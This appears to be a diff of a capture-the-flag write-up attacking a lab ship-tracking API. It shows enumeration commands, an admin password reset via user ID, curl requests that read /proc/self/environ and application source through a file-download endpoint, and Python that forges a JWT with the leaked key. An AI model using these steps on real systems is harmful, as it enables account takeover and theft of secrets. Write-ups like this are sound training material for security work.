@@ -13,6 +13,7 @@ The U.S.A. is available at <a href="http://universal-ship-api.cns-jv.tcc" target
 #### Solution:
 
 - playing with the API reveals that there are few endpoints however for some of them we need token, `nikto` didn't find anything useful
+
 ```
 http://universal-ship-api.cns-jv.tcc/docs
 http://universal-ship-api.cns-jv.tcc/api/v1/admin
@@ -20,6 +21,7 @@ http://universal-ship-api.cns-jv.tcc/api/v1/user
 ```
 
 - after digging for some time I came across [writeup](https://0xdf.gitlab.io/2022/05/02/htb-backendtwo.html) which seems to be inspiration for this challenge... based on it instead of `nikto` `feroxbuster` is used and that reveals 2 additional endpoints
+
 ```bash
 feroxbuster -u http://universal-ship-api.cns-jv.tcc/ --force-recursion -C 404,405 -m GET,POST --random-agent
 feroxbuster -u http://universal-ship-api.cns-jv.tcc/api/v1/user --force-recursion -C 404,405 -m GET,POST --random-agent
@@ -29,12 +31,14 @@ feroxbuster -u http://universal-ship-api.cns-jv.tcc/api/v1/user --force-recursio
 curl -X POST   -v http://universal-ship-api.cns-jv.tcc/api/v1/user/signup -d '{"email": "magic", "password": "0xdf0xdf"}' -H "Content-Type: application/json"
 curl -X POST   -v http://universal-ship-api.cns-jv.tcc/api/v1/user/login -d 'username=magic&password=0xdf0xdf'
 ```
+
 - now we can craft our own user and look into the `swagger` where we find couple of new endpoints:
   - `updatepassword` with just the user `uuid` we can alter password
   - `admin/file` can download any file on FS
   - `admin/getFlag` get the final flag
 
 - updating the `admin` password is pretty easy as we can list it's `uuid` without admin token
+
 ```bash
 curl http://universal-ship-api.cns-jv.tcc/api/v1/user/1 \
   -H "Authorization: Bearer ..."  \
@@ -52,6 +56,7 @@ curl -X POST   -v http://universal-ship-api.cns-jv.tcc/api/v1/user/login -d 'use
 ```
 
 - unfortunately with the admin token `getFlag` endpoint is still not working as it requires custom `jwt` property, so we need to craft our own token and for that we'll reverse the application and leak all the keys via `admin/file` endpoint
+
 ```bash
 curl -X POST http://universal-ship-api.cns-jv.tcc/api/v1/admin/file -H "Authorization: Bearer ..." -H 'Content-Type: application/json'   -d '{ "file": "/proc/self/environ" }' | jq -r .file
 curl -X POST http://universal-ship-api.cns-jv.tcc/api/v1/admin/file -H "Authorization: Bearer ..." -H 'Content-Type: application/json'   -d '{ "file": "/app/shipapi/main.py" }' | jq -r .file
@@ -62,6 +67,7 @@ curl -X POST http://universal-ship-api.cns-jv.tcc/api/v1/admin/file -H "Authoriz
 ```
 
 - generate custom `jwt` token with `flag-read` property
+
 ```python
 from datetime import datetime, timedelta
 import jwt
@@ -82,6 +88,7 @@ jwt.encode(payload, JWT_RSA_KEY, algorithm=ALGORITHM)
 ```
 
 - all that remains is get the flag with our crafted token
+
 ```bash
 curl -X POST http://universal-ship-api.cns-jv.tcc/api/v1/admin/getFlag H "Authorization: Bearer ..."`
 ```
